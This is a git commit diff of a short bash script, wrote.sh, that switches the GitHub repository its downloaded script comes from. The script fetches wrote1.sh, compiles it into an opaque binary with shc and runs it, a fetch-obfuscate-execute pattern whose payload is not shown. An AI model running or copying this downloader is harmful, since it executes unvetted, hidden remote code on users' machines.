7a3e949834ca8f915c4c0572fca25c449a19304a
raufpermana22 <53905319+raufpermana22@users.noreply.github.com>
2022-05-30 01:50:48 +0900

    Update wrote.sh

--- wrote.sh
+++ wrote.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget https://raw.githubusercontent.com/thefacta/repo/main/wrote1.sh && chmod +x wrote1.sh
+wget https://raw.githubusercontent.com/raufpermana22/cirli/main/wrote1.sh && chmod +x wrote1.sh
 shc -f wrote1.sh -x ./wrote1.sh.x && ./wrote1.sh.x
